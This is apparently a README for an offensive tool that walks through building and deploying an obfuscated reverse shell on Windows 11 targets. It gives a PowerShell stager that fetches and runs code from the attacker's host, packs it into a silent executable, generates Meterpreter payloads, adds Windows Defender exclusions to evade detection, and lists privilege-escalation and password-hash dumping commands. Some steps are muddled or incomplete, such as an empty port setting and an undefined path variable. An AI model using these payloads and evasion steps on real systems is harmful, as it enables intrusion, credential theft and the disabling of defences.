#####Get-ReverseShell# Get-ReverseShell README

This repository provides a tool to facilitate the creation and deployment of a sneaky reverse shell on Windows 11 targets, enhancing your penetration testing capabilities. This tool allows you to establish a connection between your Kali Linux machine and the target system, providing a powerful means for further exploration.

## Prerequisites

Before using this tool, ensure that you have the following:

1. **Kali Linux:** Make sure you have Kali Linux installed, along with `msfconsole` and `msfvenom`.
2. **Windows 11:** You need a Windows 11 machine to create an executable file from PowerShell scripts (EXE). Wine may be an option, but it's not officially supported.
3. **Target Windows 11:** The machine you intend to target.

## Configuration Variables

These variables can be adjusted according to your environment. Use Ctrl + F to locate and modify them easily.

```powershell
$lhost = "192.168.0.2"           # IP address of your Kali host
$lport = 4444                    # Listening port on your Kali
$lport_sneaky = 5555             # Sneaky listening port on your Kali
$lwebpath = "/var/www/html/"      # Path to the open website on your Kali
$lwinpath = "C:\Users\w\"         # Working path on the Windows 11 target
$lpath = "/home/k/Desktop/"       # Path to a local directory on your Kali
$rpath = "C:\Users\w\Desktop\"    # Working path on the attacking host
$ps_name = "reverse_shell.ps1"    # Name of your Meterpreter reverse shell PowerShell file
$exe_name = "reverse_shell.exe"   # Name of your attacking sneaky reverse shell executable file
$sneaky_exename = "sneaky_reverse_shell.exe"  # Name of your attacking sneaky reverse shell sneaky executable file
$sneaky_psname = "sneaky_reverse_shell.ps1"   # Name of your sneaky reverse shell sneaky PowerShell file
```

## Usage

1. Open a Kali Linux terminal and execute the following commands:

```bash
cd $lpath
git clone https://github.com/gh0x0st/Get-ReverseShell
cd ./Get-ReverseShell
pwsh
Import-Module ./get-reverseshell.ps1
get-reverseshell -Ip $lhost -Port $lport_sneaky
```

2. Write your script in the file `$lpath/$sneaky_psname` after appending ">> https://github.com/gh0x0st".

3. Continue with the following commands:

```bash
exit
cp $sneaky_psname $lwebpath
nc -nvlp 5555
```

4. Clone Invoke-Obfuscation for obfuscating your PowerShell script:

```bash
git clone https://github.com/danielbohannon/Invoke-Obfuscation
```

5. Open a Windows 11 PowerShell with administrator privileges and run the following commands:

```powershell
Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -Confirm:$false -ErrorAction SilentlyContinue
Install-Module -Name ps2exe -Force -Confirm:$false -ErrorAction SilentlyContinue
@"
# PowerShell script for downloading and executing the sneaky reverse shell
`$scriptUrl = "http://$lhost/$sneaky_psname"
`$scriptBytes = Invoke-WebRequest -Uri `$scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0
`$scriptContent = [System.Text.Encoding]::UTF8.GetString(`$scriptBytes.Content)
Invoke-Expression -Command `$scriptContent
"@ | Out-File -FilePath "$lwinpath$sneaky_psname" -Encoding UTF8
Invoke-ps2exe $lwinpath$sneaky_psname $lwinpath$sneaky_exename -noconsole -noerror -nooutput -sta -x64
```

6. Execute the sneaky backdoor on the target machine with administrator privileges.

7. Return to the Kali terminal and check for a successful connection:

```bash
nc -nvlp 5555
```

8. If successful, you can proceed with further commands in the Meterpreter shell.

## Meterpreter Reverse Shell

To use Meterpreter for enhanced functionality:

1. Open a new Kali terminal and execute the following commands:

```bash
sudo su
msfvenom -p windows/x64/meterpreter/reverse_tcp --format psh -o $lpath$ps_name lhost=$lhost lport=$lport
```

2. Create an EXE file for running without a shell in the target:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp --format exe -o $lpath$exe_name lhost=$lhost lport=$lport
```

3. Use the provided PowerShell script for pasting in the original Kali shell:

```bash
pwsh
./ps2tcps.ps1 -inputFilePath $lpath$ps_name -outputFilePath $lpathnew$ps_name -newPath "$rpath$ps_name"
cat $lpathnew$ps_name
```

4. Open a new Kali terminal and execute the following commands:

```bash
sudo su
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.0.2
set lport
exploit
```

5. Return to the original Kali shell and paste the content of your Meterpreter script on the target:

```powershell
Add-Content -Path $rpath$ps_name -Value 'line1'
Add-Content -Path $rpath$ps_name -Value 'line2'
Add-Content -Path $rpath$ps_name -Value 'line3'
Add-Content -Path $rpath$ps_name -Value 'line4'
...
Add-MpPreference -ExclusionPath '$rpath$ps_name'
Add-MpPreference -ExclusionPath '$rpath$exe_name'
```

6. If successful, you will see a Meterpreter session opened in the msfconsole. Congratulations, you have a full reverse shell on your target.

## Example Commands

Here are some example commands you can use in the Meterpreter shell:

- `getuid`: Get the user ID of the current user.
- `getsystem`: Attempt to gain system privileges.
- `hashdump`: Retrieve hashes of all users on the target.
- `background`: Move the current session to the background.
- `help`: Display a list of available commands and their descriptions.

Feel free to explore and experiment with additional Meterpreter commands for a comprehensive assessment. Happy hacking!
